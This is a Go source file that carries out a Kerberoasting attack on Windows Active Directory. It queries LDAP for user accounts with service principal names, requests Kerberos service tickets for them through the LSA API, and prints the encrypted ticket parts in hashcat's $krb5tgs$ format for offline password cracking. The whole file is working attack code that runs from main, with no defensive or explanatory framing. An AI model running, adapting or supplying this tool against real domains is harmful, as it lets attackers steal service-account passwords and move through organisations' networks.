package main

//go:generate go run golang.org/x/sys/windows/mkwinsyscall -output syscallwin.go main.go

import (
	_ "embed"
	"encoding/hex"
	"fmt"
	"log"
	"math"
	"regexp"
	"strconv"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//sys ldap_initW(hostName string, portNumber uint32) (ld uintptr, err error) = Wldap32.ldap_initA
//sys ldap_bind_sW(ld uintptr, dn *uint8, cred *uint8, method uint32) (ret uint32) = Wldap32.ldap_bind_sA
//sys ldap_search_sA(ld uintptr, base *uint8, scope uint32, filter *uint8,  attrs **uint8, attrsonly uint32, res *uintptr) (ret uint32) = Wldap32.ldap_search_sA
//sys ldap_count_entries(ld uintptr, res uintptr) (ret uint32) = Wldap32.ldap_count_entries
//sys ldap_get_valuesA(ld uintptr, entry uintptr, attr *uint8) (ret **uint8) = Wldap32.ldap_get_valuesA
//sys ldap_first_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_first_entry
//sys ldap_next_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_next_entry
//sys ldap_value_free(vals **uint8) (ret uint32) = Wldap32.ldap_value_free
//sys ldap_unbind_s(ld uintptr) (ret uint32) = Wldap32.ldap_unbind_s

//sys LsaConnectUntrusted(lsaHandle *uintptr) (ret uint32) = Secur32.LsaConnectUntrusted
//sys LsaDeregisterLogonProcess(lsaHandle uintptr) (ret uint32) = Secur32.LsaDeregisterLogonProcess
//sys LsaLookupAuthenticationPackage(lsaHandle uintptr, packageName *LSA_STRING, authenticationPackage *uint32) (ret uint32) = Secur32.LsaLookupAuthenticationPackage
//sys LsaCallAuthenticationPackage(lsaHandle uintptr, authenticationPackage uint32, protocolSubmitBuffer uintptr, submitBufferLength uint32, protocolReturnBuffer *uintptr, returnBufferLength *uint32, pNTSTATUS *uint32) (ret uint32) = Secur32.LsaCallAuthenticationPackage

//sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA

//http://www.wisdomsoft.jp/421.html
//https://qiita.com/t-yama-3/items/724f5f76356b814b0b2d
type (
	DWORD    uint32
	DWORD64  uint64
	LPVOID   uintptr
	LPDWORD  *uint32
	LPCSTR   *int8
	LPCWSTR  *int16
	LPSTR    *int16
	HANDLE   uintptr
	PHANDLE  *uintptr
	BYTE     byte
	ULONG    uint32
	PSTR     *uint8
	PZPSTR   **uint8
	PWSTR    *uint16
	SHORT    int16
	PCHAR    *uint8
	PUCHAR   *uint8
	CHAR     uint8
	NTSTATUS uint32
)

const (
	LDAP_PORT           uint32 = 389
	LDAP_AUTH_OTHERKIND uint32 = 0x86
	LDAP_AUTH_NEGOTIATE uint32 = (LDAP_AUTH_OTHERKIND | 0x0400)
	LDAP_SUCCESS        uint32 = 0
	LDAP_SCOPE_BASE     uint32 = 0x00
	LDAP_SCOPE_ONELEVEL uint32 = 0x01
	LDAP_SCOPE_SUBTREE  uint32 = 0x02
)

const (
	STATUS_SUCCESS                      uint32 = uint32(windows.STATUS_SUCCESS)
	STATUS_ACCESS_DENIED                uint32 = uint32(windows.STATUS_ACCESS_DENIED)
	DEFAULT_AUTH_PKG_ID                 uint32 = math.MaxUint32
	MICROSOFT_KERBEROS_NAME_A           string = "Kerberos"
	KERB_RETRIEVE_TICKET_DEFAULT        uint32 = 0x0
	KERB_RETRIEVE_TICKET_DONT_USE_CACHE uint32 = 0x1
	KERB_RETRIEVE_TICKET_AS_KERB_CRED   uint32 = 0x8
	KerbRetrieveEncodedTicketMessage    uint32 = 8
	KerbForwardable                     uint32 = 1073741824
	KerbForwarded                       uint32 = 536870912
	KerbRenewable                       uint32 = 8388608
	KerbPre_authent                     uint32 = 2097152
	ticketFlags                         uint32 = KerbForwardable | KerbForwarded | KerbRenewable | KerbPre_authent
)

type User struct {
	sAMAccountName       string
	distinguishedName    string
	servicePrincipalName string
}

type LSA_STRING struct {
	length        int16
	maximumLength int16
	buffer        *byte
}

type KERB_RETRIEVE_TKT_REQUEST struct {
	messageType       uint32
	logonId           windows.LUID
	targetName        windows.NTUnicodeString
	ticketFlags       uint32
	cacheOptions      uint32
	encryptionType    int32
	credentialsHandle SecHandle
}
type KERB_RETRIEVE_TKT_RESPONSE struct {
	ticket KERB_EXTERNAL_TICKET
}

type KERB_EXTERNAL_TICKET struct {
	serviceName         uintptr //PKERB_EXTERNAL_NAME
	targetName          uintptr //PKERB_EXTERNAL_NAME
	clientName          uintptr //PKERB_EXTERNAL_NAME
	domainName          windows.NTUnicodeString
	targetDomainName    windows.NTUnicodeString
	altTargetDomainName windows.NTUnicodeString
	sessionKey          KERB_CRYPTO_KEY
	ticketFlags         uint32
	flags               uint32
	keyExpirationTime   int64
	dtartTime           int64
	rndTime             int64
	renewUntil          int64
	timeSkew            int64
	encodedTicketSize   uint32
	encodedTicket       *uint32
}
type KERB_EXTERNAL_NAME struct {
	nameType  int16
	nameCount uint16
	names     []windows.NTUnicodeString
}

type KERB_CRYPTO_KEY struct {
	keyType int32
	length  uint32
	value   *uint8
}

type SecHandle struct {
	dwLower uintptr
	dwUpper uintptr
}

func kerbExternalNameFromPtr(ptr uintptr) KERB_EXTERNAL_NAME {
	ret := KERB_EXTERNAL_NAME{}
	ret.nameType = *(*int16)(unsafe.Add(unsafe.Pointer(ptr), 0))
	ret.nameCount = *(*uint16)(unsafe.Add(unsafe.Pointer(ptr), 2))
	unicodeStringsSize := int(unsafe.Sizeof(windows.NTUnicodeString{}))
	for i := 0; i < int(ret.nameCount); i++ {
		offset := 4 + unicodeStringsSize*i
		name := *(*windows.NTUnicodeString)(unsafe.Add(unsafe.Pointer(ptr), offset))
		ret.names = append(ret.names, name)
	}
	return ret
}

//Max 1000byte /without error handling
func ldap_get_values(ld uintptr, entry uintptr, attr string) string {
	attrPtr, _ := syscall.BytePtrFromString(attr)
	val := ldap_get_valuesA(ld, entry, attrPtr)
	var resByte []byte
	for i := 0; i < 1000; i++ {
		tmp := (*uint8)(unsafe.Add(unsafe.Pointer(*val), i))
		if *tmp == 0 {
			break
		}
		resByte = append(resByte, *tmp)
	}
	ldap_value_free(val)
	return string(resByte)
}

func getDomainSPNTicket(user User) {
	spn := user.servicePrincipalName
	var hLsa uintptr
	if LsaConnectUntrusted(&hLsa) != STATUS_SUCCESS {
		panic("KerberosTicketsManger::InitializeConnection: LsaConnectUntrusted failed")
	}

	lsaStrAuthPkgLangth := int16(len(MICROSOFT_KERBEROS_NAME_A))
	lsaStrAuthPkgMaxLangth := int16(len(MICROSOFT_KERBEROS_NAME_A))
	// lsaStrAuthPkgBuffer := make([]byte, lsaStrAuthPkgLangth)
	// copy(lsaStrAuthPkgBuffer, MICROSOFT_KERBEROS_NAME_A)
	lsaStrAuthPkgBuffer, err := windows.BytePtrFromString(MICROSOFT_KERBEROS_NAME_A)
	if err != nil {
		panic("BytePtrFromString Error")
	}
	//ToDo: hLsa defer and release
	lsaStrAuthPkg := LSA_STRING{}
	lsaStrAuthPkg.length = lsaStrAuthPkgLangth
	lsaStrAuthPkg.maximumLength = lsaStrAuthPkgMaxLangth
	lsaStrAuthPkg.buffer = lsaStrAuthPkgBuffer
	authPkgId := DEFAULT_AUTH_PKG_ID
	ticketsStatus := LsaLookupAuthenticationPackage(hLsa, &lsaStrAuthPkg, &authPkgId)
	if ticketsStatus != STATUS_SUCCESS {
		panic("KerberosTicketsManger::InitializeConnection: LsaLookupAuthenticationPackage failed")
	}
	luid := windows.LUID{LowPart: 0, HighPart: 0}
	hSec := SecHandle{dwLower: 0, dwUpper: 0}

	krbTmp := make([]byte, int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{}))+((len(spn))*2))
	siz := int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{})) + ((len(spn)) * 2)
	kerbRetrieveTktRequest := (*KERB_RETRIEVE_TKT_REQUEST)(unsafe.Pointer(&krbTmp[0]))
	// KERB_RETRIEVE_TKT_REQUEST{}
	// buffer := make([]uint16, length)
	target := windows.NTUnicodeString{}
	buffer := windows.StringToUTF16Ptr(spn)
	// length := uint16((len(spn)+1)*2 - 2)
	target.Length = uint16((len(spn)+1)*2 - 2)
	target.MaximumLength = uint16((len(spn)) * 2)
	target.Buffer = (*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))))
	// buf := (*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))))
	for i := 0; i < (int(target.MaximumLength) / 2); i++ {
		tmp := *(*uint16)(unsafe.Add((unsafe.Pointer(buffer)), i*2))
		*(*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))+(i*2))) = tmp
	}
	// fmt.Printf("utf16length: %d  length: %d\n", target.Length, len(spn))

	kerbRetrieveTktRequest.messageType = KerbRetrieveEncodedTicketMessage
	kerbRetrieveTktRequest.logonId = luid
	kerbRetrieveTktRequest.targetName = target
	kerbRetrieveTktRequest.ticketFlags = ticketFlags
	kerbRetrieveTktRequest.cacheOptions = KERB_RETRIEVE_TICKET_DEFAULT
	kerbRetrieveTktRequest.encryptionType = 0
	kerbRetrieveTktRequest.credentialsHandle = hSec
	protocolSubmitBuffer := uintptr(unsafe.Pointer(kerbRetrieveTktRequest))
	submitBufferLength := uint32(siz)
	// protocolReturnBufferBase := KERB_RETRIEVE_TKT_RESPONSE{}
	// protocolReturnBuffer := uintptr(unsafe.Pointer(&protocolReturnBufferBase))
	var protocolReturnBuffer uintptr
	responseLen := uint32(math.MaxUint32)
	protocolStatus := STATUS_ACCESS_DENIED
	ticketsStatus = LsaCallAuthenticationPackage(hLsa, authPkgId, protocolSubmitBuffer, submitBufferLength, &protocolReturnBuffer, &responseLen, &protocolStatus)

	if ticketsStatus != STATUS_SUCCESS {
		panic("KerberosTicketsManger::RequestTicketFromSystem: LsaCallAuthenticationPackage failed")
	}
	if protocolStatus != STATUS_SUCCESS {
		panic("KerberosTicketsManger::RequestTicketFromSystem: ProtocolStatus failed")
	}
	encodedTicket := []byte{}
	protocolReturnBufferRaw := (*KERB_RETRIEVE_TKT_RESPONSE)(unsafe.Pointer(protocolReturnBuffer))
	for i := 0; i < int(protocolReturnBufferRaw.ticket.encodedTicketSize); i++ {
		offset := i
		tmp := *(*byte)(unsafe.Add(unsafe.Pointer(protocolReturnBufferRaw.ticket.encodedTicket), offset))
		encodedTicket = append(encodedTicket, tmp)
	}

	ticketHexStream := hex.EncodeToString(encodedTicket)
	reg := regexp.MustCompile("a382....3082....a0030201(..)a1.{1,4}.......a282(....)........(.+)")
	group := reg.FindAllStringSubmatch(ticketHexStream, -1)

	eType, _ := strconv.ParseInt(group[0][1], 16, 64)             //binary.BigEndian.Uint64(eTypeByte)
	cipherTextLenBase, _ := strconv.ParseInt(group[0][2], 16, 64) //binary.BigEndian.Uint64(eTypeByte)
	cipherTextLen := int(cipherTextLenBase - 4)
	dataToEnd := group[0][3]
	cipherText := dataToEnd[:cipherTextLen*2]
	fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", eType, "user", "domain", spn, cipherText[:32], cipherText[32:])
}

func kerberoast() []User {
	var nameType uint32 = windows.ComputerNameDnsDomain
	var bufSize uint32 = 0

	GetComputerNameExA(nameType, nil, &bufSize)
	hostNameByte := make([]uint8, bufSize)
	GetComputerNameExA(nameType, unsafe.Pointer(&hostNameByte[0]), &bufSize)
	hostName := string(hostNameByte[:len(hostNameByte)-1])

	ld, _ := ldap_initW(hostName, LDAP_PORT)
	iRtn := ldap_bind_sW(ld, nil, nil, LDAP_AUTH_NEGOTIATE)
	if iRtn != LDAP_SUCCESS {
		fmt.Println(iRtn)
		log.Fatalln("Bind error")
	}
	var res uintptr

	ldapStatus := ldap_search_sA(ld, nil, LDAP_SCOPE_BASE, nil, nil, 0, &res)
	if ldapStatus != LDAP_SUCCESS {
		log.Fatalln("ldap_search_sA error")
	}

	numEntries := ldap_count_entries(ld, res)
	domainDN := ldap_get_values(ld, res, "defaultNamingContext")
	base, err := syscall.BytePtrFromString(domainDN)
	if err != nil {
		panic(err)
	}
	filter, err := syscall.BytePtrFromString("(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))")
	if err != nil {
		panic(err)
	}

	ldapStatus = ldap_search_sA(ld, base, LDAP_SCOPE_SUBTREE, filter, nil, 0, &res)
	if ldapStatus != LDAP_SUCCESS {
		log.Fatalln("ldap_search_sA error")
	}

	numEntries = ldap_count_entries(ld, res)
	entry := ldap_first_entry(ld, res)

	var users []User
	for i := 0; i < int(numEntries); i++ {
		samAccountName := ldap_get_values(ld, entry, "samAccountName")
		distinguishedName := ldap_get_values(ld, entry, "distinguishedName")
		servicePrincipalName := ldap_get_values(ld, entry, "servicePrincipalName")
		users = append(users, User{sAMAccountName: samAccountName, distinguishedName: distinguishedName, servicePrincipalName: servicePrincipalName})
		entry = ldap_next_entry(ld, entry)
	}
	ldap_unbind_s(ld)
	return users
}

func main() {
	users := kerberoast()
	for _, user := range users {
		getDomainSPNTicket(user)
	}

	// usage := `Usage: usage`
	// if len(os.Args) < 2 {
	// 	fmt.Println(usage)
	// } else if os.Args[1] == "/do" {
	// 	kerberoast()
	// } else {
	// 	return
	// }
}
